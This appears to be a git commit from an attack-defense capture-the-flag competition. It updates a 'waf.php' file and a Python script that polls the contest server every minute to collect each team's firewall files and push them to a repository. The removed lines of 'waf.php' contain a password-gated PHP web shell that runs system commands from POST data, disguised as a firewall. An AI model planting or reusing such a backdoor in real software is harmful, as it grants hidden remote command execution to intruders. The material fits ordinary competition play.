93132e45775e2be7e9349dde09da8d2bc1a7d5c2
racterub <racterub@gmail.com>
2022-02-13 10:08:25 +0800

    update waf

--- 33/waf.php
+++ 33/waf.php
@@ -1,2 +1,4 @@
-<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="c29f375f360a285114f39974f4c2a27443312148")@system($_POST["w"]);
-@include_once "/var/www/html/logs/w";
+<?php
+foreach ($_REQUEST as $k => $v) {
+    $_REQUEST[$k]=preg_replace("/flag/",'',$v);
+}
--- download_waf.py
+++ download_waf.py
@@ -2,20 +2,22 @@
 import os
 import requests
 import re
-
+import time
 scan_range = list(range(18, 43))
 # scan_range = [37]
 
-for i in scan_range:
-    r = requests.get(f"http://chals2.eof.ais3.org:8000/waf/{i}")
-    external = re.findall('@include(?:_once)?\s"\/var\/www\/html\/(.+)";', r.text)
-    if external:
-        external_waf = requests.get(f"http://chals2.eof.ais3.org:{30000+i}/{external[0]}")
-    if external_waf.text:
-        with open(f"{i}/external.php", "w") as f:
-            f.write(external_waf.text)
-    with open(f"{i}/waf.php", "w") as f:
-        f.write(r.text)
+while True:
+    for i in scan_range:
+        r = requests.get(f"http://chals2.eof.ais3.org:8000/waf/{i}")
+        external = re.findall('@include(?:_once)?\s"\/var\/www\/html\/(.+)";', r.text)
+        if external:
+            external_waf = requests.get(f"http://chals2.eof.ais3.org:{30000+i}/{external[0]}")
+        if external_waf.text:
+            with open(f"{i}/external.php", "w") as f:
+                f.write(external_waf.text)
+        with open(f"{i}/waf.php", "w") as f:
+            f.write(r.text)
 
-os.system("git add . && git commit -m 'update waf' && git push origin master")
+    os.system("git add . && git commit -m 'update waf' && git push origin master")
+    time.sleep(60)
 
